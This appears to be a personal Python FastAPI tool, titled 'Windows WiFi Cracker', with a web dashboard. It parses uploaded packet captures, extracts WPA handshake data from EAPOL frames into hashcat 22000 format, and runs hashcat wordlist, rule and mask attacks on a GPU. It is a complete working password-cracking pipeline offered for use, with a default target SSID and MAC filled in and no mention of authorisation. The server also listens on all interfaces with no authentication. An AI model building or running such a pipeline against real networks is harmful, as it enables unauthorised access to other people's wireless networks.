#!/usr/bin/env python3
"""
Windows WiFi Cracker (port 8766) - hashcat control + receive from Mac.
Reference workflow: hcxpcapngtool -> hashcat (like hcxdumptool ecosystem)
"""
import os, sys, json, subprocess, threading, time, re
from pathlib import Path
from datetime import datetime
from fastapi import FastAPI, UploadFile, File, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

app = FastAPI(title="Windows WiFi Cracker")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

HASHCAT = r"C:\tools\hashcat-7.1.2\hashcat.exe"
HASHCAT_DIR = r"C:\tools\hashcat-7.1.2"
RULES = {
    "best66": os.path.join(r"C:\tools\hashcat-7.1.2\rules", "best66.rule"),
    "dive": os.path.join(r"C:\tools\hashcat-7.1.2\rules", "dive.rule"),
}
WORDLISTS = {
    "rockyou": r"C:\wifi-crack\wordlists\rockyou.txt",
    "wifi_wordlist": r"C:\wifi-crack\wordlists\wifi_wordlist_combined.txt",
}
POTFILE = r"C:\Users\crazydb911\Documents\deepseek\hashes\test_pot"
UPLOAD_DIR = r"C:\Users\crazydb911\Documents\deepseek\uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Thermal management
TEMP_LIMIT = 85       # normal throttle
TEMP_CRIT = 92        # critical abort
TEMP_COOLDOWN = 10    # seconds to wait when throttling

STATE = {
    "status": "idle",
    "message": "Ready",
    "progress": 0,
    "hash_file": None,
    "hash_count": 0,
    "ssid": None,
    "results": [],
    "log": [],
    "gpu_temp": None,
    "gpu_util": None,
    "speed": None,
    "cracking": False,
    "attack_info": None,
}

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {msg}"
    STATE["log"].append(entry)
    print(entry, flush=True)
    if len(STATE["log"]) > 800:
        STATE["log"] = STATE["log"][-800:]

def get_gpu_status():
    try:
        r = subprocess.run(
            ['nvidia-smi', '--query-gpu=temperature.gpu,utilization.gpu', '--format=csv,noheader'],
            capture_output=True, text=True, timeout=5)
        t, u = r.stdout.strip().split(',')
        STATE["gpu_temp"] = int(t.strip())
        STATE["gpu_util"] = int(u.strip().replace('%', ''))
    except:
        pass

def thermal_monitor():
    """Monitor GPU temp during cracking, throttle if needed."""
    last_throttle = 0
    while STATE["cracking"]:
        get_gpu_status()
        temp = STATE.get("gpu_temp")
        if temp and temp >= TEMP_CRIT:
            if time.time() - last_throttle > TEMP_COOLDOWN:
                STATE["message"] = f"⚠️ GPU {temp}°C - CRITICAL (aborting)..."
                log(f"GPU {temp}°C >= {TEMP_CRIT}°C - CRITICAL")
                last_throttle = time.time()
        elif temp and temp >= TEMP_LIMIT:
            if time.time() - last_throttle > TEMP_COOLDOWN:
                STATE["message"] = f"🌡️ GPU {temp}°C - Throttling (waiting)..."
                log(f"GPU {temp}°C >= {TEMP_LIMIT}°C - Throttle")
                last_throttle = time.time()
                time.sleep(TEMP_COOLDOWN)
        time.sleep(3)

def get_crack_status():
    """Read hashcat progress from restore file or process output."""
    if not STATE["cracking"]:
        return
    # Try to read from the last hashcat output we captured
    try:
        # Check if hashcat is still running
        r = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq hashcat.exe'], capture_output=True, text=True, timeout=5)
        if 'hashcat.exe' not in r.stdout:
            STATE["cracking"] = False
            STATE["status"] = "idle"
            STATE["message"] = "Hashcat finished"
    except:
        pass

def extract_hashes(pcap_path, ssid, ap_mac_hint=None):
    STATE["status"] = "extracting"
    STATE["message"] = f"Extracting handshakes (SSID: {ssid})..."
    STATE["progress"] = 30
    log(f"Extracting from {pcap_path}")
    try:
        from collections import defaultdict
        from scapy.all import rdpcap, Ether, EAPOL_KEY
        pkts = rdpcap(pcap_path)
        log(f"Total packets: {len(pkts)}")
        
        rsc_groups = defaultdict(list)
        ap_mac_detected = ap_mac_hint or None
        
        for pkt in pkts:
            if not pkt.haslayer(EAPOL_KEY):
                continue
            ek = pkt[EAPOL_KEY]
            raw = bytes(ek)
            key_info = int.from_bytes(raw[1:3], 'big')
            msg_num = (key_info >> 8) & 0x03
            rsc_raw = raw[13:17]
            rsc = rsc_raw.hex()
            mic = ek.key_mic.hex() if hasattr(ek, 'key_mic') else ''
            nonce = ek.key_nonce.hex() if hasattr(ek, 'key_nonce') else ''
            dst_mac = '000000000000'
            src_mac = '000000000000'
            if pkt.haslayer(Ether):
                eth = pkt[Ether]
                dst_mac = str(eth.dst).replace(':', '').lower()
                src_mac = str(eth.src).replace(':', '').lower()
                # Detect AP MAC (dst of M1 = AP)
                if msg_num == 1 and not ap_mac_detected:
                    ap_mac_detected = dst_mac
            rsc_groups[rsc].append({
                'msg_num': msg_num, 'dst_mac': dst_mac, 'src_mac': src_mac,
                'nonce': nonce, 'mic': mic, 'raw': raw
            })
        
        log(f"RSC groups: {len(rsc_groups)}, AP MAC: {ap_mac_detected}")
        ssid_hex = ssid.encode('utf-8').hex()
        hashes = []
        pairs = 0
        for rsc, group in sorted(rsc_groups.items()):
            m1 = [f for f in group if f['msg_num'] == 1]
            m3 = [f for f in group if f['msg_num'] == 3]
            if not (m1 and m3):
                continue
            pairs += 1
            m1f, m3f = m1[0], m3[0]
            # AP MAC: dst of M1 (or use hint)
            ap_mac = m1f['dst_mac'] or ap_mac_detected or '6c4f894ca0e4'
            sta_mac = m1f['src_mac']  # STA sends M1
            anonce = m1f['nonce']     # ANonce from M1
            key_mic = m3f['mic']      # MIC from M3 (16 bytes)
            ek_raw = m3f['raw']       # Full EAPOL frame from M3
            eapol_len = len(ek_raw)
            # Build full EAPOL frame: version(1) + type(1) + length(2) + EAPOL_KEY
            full_frame = bytes([1, 0x03]) + eapol_len.to_bytes(2, 'big') + ek_raw
            eapol_hex = full_frame.hex()
            hash_str = f"WPA*02*{key_mic}*{ap_mac}*{sta_mac}*{ssid_hex}*{anonce}*{eapol_hex}*03"
            hashes.append(hash_str)
            # Verify nonces
            if m1f['nonce'] == m3f['nonce']:
                log(f"  ⚠️ RSC {rsc}: ANonce == SNonce (truncated?)")
        
        log(f"M1+M3 pairs: {pairs}")
        hash_file = str(Path(pcap_path).with_suffix('.hc22000'))
        with open(hash_file, 'w') as f:
            f.write('\n'.join(hashes) + '\n')
        STATE["hash_file"] = hash_file
        STATE["hash_count"] = len(hashes)
        STATE["ssid"] = ssid
        STATE["status"] = "idle"
        STATE["message"] = f"Extracted {len(hashes)} hashes ({pairs} pairs)"
        STATE["progress"] = 50
        log(f"Extracted {len(hashes)} hashes -> {hash_file}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Extract error: {e}"
        log(f"Extract error: {e}")

def crack_hashes(hash_file, wordlist_key, rules_key=None, mode="0", mask=None):
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["progress"] = 60
    wordlist = WORDLISTS.get(wordlist_key, wordlist_key)
    rules = RULES.get(rules_key) if rules_key else None
    info = f"mode={mode}, wordlist={wordlist_key}, rules={rules_key or 'none'}"
    STATE["attack_info"] = info
    log(f"Starting hashcat ({info})")
    try:
        cmd = [HASHCAT, "-m", "22000",
               "--self-test-disable", "--restore-disable",
               f"--hwmon-temp-abort={TEMP_CRIT}", "-w", "2",
               "--potfile-path", POTFILE]
        if mode == "0":
            # Straight: wordlist (with optional rules)
            cmd.extend(["-a", "0", hash_file, wordlist])
            if rules:
                cmd.extend(["-r", rules])
        elif mode == "3":
            # Hybrid: wordlist + mask
            cmd.extend(["-a", "3", hash_file, wordlist, mask or "?d?d?d?d?d?d?d?d"])
        elif mode == "1":
            # Brute force: mask only
            cmd.extend(["-a", "3", hash_file, mask or "?d?d?d?d?d?d?d?d"])
        elif mode == "mask":
            # Mask attack: mask only (alias for 1)
            cmd.extend(["-a", "3", hash_file, mask or "?d?d?d?d?d?d?d?d"])
        log(f"CMD: {' '.join(cmd)}")
        # Remove --quiet to see progress
        if "--quiet" in cmd:
            cmd.remove("--quiet")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, cwd=HASHCAT_DIR)
        start_time = time.time()
        last_log = 0
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            # Log progress every 15s
            now = time.time()
            if now - last_log > 15:
                last_log = now
                elapsed = int(now - start_time)
                STATE["message"] = f"Cracking... ({elapsed}s) {line[:100]}"
                log(f"[{elapsed}s] {line[:150]}")
            # Check for results
            if re.match(r'^[0-9a-f]{64}:', line):
                STATE["results"].append(line)
                log(f"CRACKED: {line}")
            if 'Speed' in line and 'MH/s' in line:
                STATE["speed"] = line
            if 'Status' in line:
                log(line)
        proc.wait()
        elapsed = int(time.time() - start_time)
        results = STATE["results"]
        if not results:
            results.append("No match")
        STATE["status"] = "idle"
        STATE["cracking"] = False
        STATE["progress"] = 100
        STATE["message"] = f"Done ({elapsed}s): {len(results)} result(s)"
        log(f"Done in {elapsed}s: {results}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["cracking"] = False
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")

@app.get("/")
async def root():
    return HTMLResponse("""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Windows WiFi Cracker</title>
<style>
body{font-family:-apple-system,sans-serif;max-width:1000px;margin:0 auto;padding:20px;background:#1a1a2e;color:#eee}
h1{color:#4fc3f7}
.card{background:#16213e;border-radius:8px;padding:15px;margin:10px 0}
.status{color:#4fc3f7;font-weight:bold}
.progress{width:100%;height:20px;background:#0f3460;border-radius:10px;overflow:hidden}
.progress-bar{height:100%;background:#4fc3f7;transition:width 0.3s}
.log{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;font-size:12px;max-height:300px;overflow-y:auto}
button{background:#4fc3f7;color:#1a1a2e;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-size:16px;margin:5px}
button:hover{background:#29b6f6}
button:disabled{background:#555;cursor:not-allowed}
.gpu{display:flex;gap:20px;margin:10px 0}
.gpu-item{background:#0f3460;padding:10px;border-radius:4px;min-width:100px;text-align:center}
.gpu-value{font-size:24px;color:#4fc3f7;font-weight:bold}
select,input{background:#0f3460;color:#eee;border:none;padding:8px;border-radius:4px;margin:5px}
.results{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;white-space:pre-wrap;margin-top:10px}
</style></head><body>
<h1>Windows WiFi Cracker (RTX 4090)</h1>
<div class="card">
<div class="status">Status: <span id="status">Loading</span></div>
<div class="progress"><div class="progress-bar" id="progress" style="width:0%"></div></div>
<p id="message">Loading...</p>
<div class="gpu">
<div class="gpu-item"><div>GPU Temp</div><div class="gpu-value" id="gpu-temp">--</div><div id="temp-bar" style="height:4px;background:#4fc3f7;border-radius:2px;margin-top:4px;width:0%"></div></div>
<div class="gpu-item"><div>GPU Util</div><div class="gpu-value" id="gpu-util">--</div></div>
<div class="gpu-item"><div>Hashes</div><div class="gpu-value" id="hash-count">0</div></div>
<div class="gpu-item"><div>SSID</div><div class="gpu-value" style="font-size:14px" id="ssid">--</div></div>
</div>
<div style="margin:10px 0">
<label>Temp Limit: <input type="range" id="temp-limit" min="70" max="95" value="85" style="width:150px;vertical-align:middle"> <span id="temp-limit-val">85</span>°C</label>
<button onclick="stopCrack()" style="background:#ff5252;font-size:14px;padding:6px 14px" id="btn-stop">Stop</button>
</div>
</div>
<div class="card">
<h2>Upload & Extract</h2>
<input type="file" id="pcap-file" accept=".pcap,.pcapng,.cap">
<input type="text" id="ssid-input" placeholder="SSID" style="width:200px">
<button onclick="extract()" id="btn-extract">Extract</button>
</div>
<div class="card">
<h2>Crack</h2>
<select id="wordlist"><option value="rockyou">rockyou (490)</option><option value="wifi_wordlist">wifi_wordlist (175K)</option></select>
<select id="rules"><option value="">No rules</option><option value="best66">best66</option><option value="dive">dive</option></select>
<select id="mode"><option value="0">Straight (-a 0)</option><option value="3">Hybrid (-a 3)</option><option value="mask">Mask (-a 3)</option></select>
<input type="text" id="mask" placeholder="mask (e.g. ?d?d?d?d?d?d?d?d)" style="width:250px">
<button onclick="crack()" id="btn-crack" disabled>Crack</button>
<div class="results" id="results">No results yet</div>
</div>
<div class="card"><h2>Log</h2><div class="log" id="log"></div></div>
<script>
function update(){fetch('/api/state').then(r=>r.json()).then(d=>{
document.getElementById('status').textContent=d.status;
document.getElementById('progress').style.width=d.progress+'%';
document.getElementById('message').textContent=d.message;
document.getElementById('log').innerHTML=d.log.join('<br>');
document.getElementById('log').scrollTop=document.getElementById('log').scrollHeight;
document.getElementById('gpu-temp').textContent=d.gpu_temp?d.gpu_temp+'°C':'--';
document.getElementById('gpu-util').textContent=d.gpu_util?d.gpu_util+'%':'--';
const tb=document.getElementById('temp-bar');
if(d.gpu_temp){tb.style.width=Math.min(d.gpu_temp,100)+'%';
tb.style.background=d.gpu_temp>=85?'#ff5252':d.gpu_temp>=75?'#ff9800':'#4fc3f7';}
document.getElementById('hash-count').textContent=d.hash_count||0;
document.getElementById('ssid').textContent=d.ssid||'--';
document.getElementById('results').textContent=d.results.length?d.results.join('\\n'):'No results yet';
document.getElementById('btn-crack').disabled=!d.hash_file||d.status!=='idle';
document.getElementById('btn-extract').disabled=d.status!=='idle';
}).catch(e=>console.error(e))}
function extract(){
const f=document.getElementById('pcap-file').files[0];
const s=document.getElementById('ssid-input').value||'32H9F_5G';
if(!f){alert('Select pcap');return}
document.getElementById('btn-extract').disabled=true;
const fd=new FormData();fd.append('file',f);fd.append('ssid',s);
fetch('/api/extract',{method:'POST',body:fd}).then(r=>r.json()).then(update);
}
function crack(){
const w=document.getElementById('wordlist').value;
const r=document.getElementById('rules').value||null;
const m=document.getElementById('mode').value;
const mk=document.getElementById('mask').value||null;
const tl=document.getElementById('temp-limit').value;
document.getElementById('btn-crack').disabled=true;
fetch(`/api/crack?wordlist=${w}&rules=${r}&mode=${m}&mask=${encodeURIComponent(mk)}&temp_limit=${tl}`,{method:'POST'}).then(r=>r.json()).then(update);
}
function stopCrack(){fetch('/api/stop',{method:'POST'}).then(r=>r.json()).then(update)}
document.getElementById('temp-limit').addEventListener('input',function(){
document.getElementById('temp-limit-val').textContent=this.value;
});
update();setInterval(update,2000);
</script></body></html>""")

@app.get("/api/state")
async def get_state():
    get_gpu_status()
    get_crack_status()
    return JSONResponse(STATE)

@app.post("/api/extract")
async def api_extract(file: UploadFile = File(...), ssid: str = "32H9F_5G"):
    content = await file.read()
    ext = ".pcapng" if ".pcapng" in (file.filename or "") else ".pcap"
    pcap_path = os.path.join(UPLOAD_DIR, f"upload_{int(time.time())}{ext}")
    with open(pcap_path, 'wb') as f:
        f.write(content)
    threading.Thread(target=extract_hashes, args=(pcap_path, ssid), daemon=True).start()
    return JSONResponse({"ok": True, "path": pcap_path})

@app.post("/api/crack")
async def api_crack(wordlist: str = "rockyou", rules: str = None, mode: str = "0", mask: str = None, temp_limit: int = 85):
    global TEMP_LIMIT
    if temp_limit:
        TEMP_LIMIT = temp_limit
    if STATE["hash_file"]:
        threading.Thread(target=thermal_monitor, daemon=True).start()
        threading.Thread(target=crack_hashes, args=(STATE["hash_file"], wordlist, rules, mode, mask), daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/stop")
async def api_stop():
    """Stop current cracking."""
    r = subprocess.run(['taskkill', '/F', '/IM', 'hashcat.exe'], capture_output=True, text=True)
    STATE["cracking"] = False
    STATE["status"] = "idle"
    STATE["message"] = "Stopped"
    log("Crack stopped by user")
    return JSONResponse({"ok": True})

if __name__ == "__main__":
    log("Windows WiFi Cracker starting on port 8766...")
    get_gpu_status()
    uvicorn.run(app, host="0.0.0.0", port=8766)
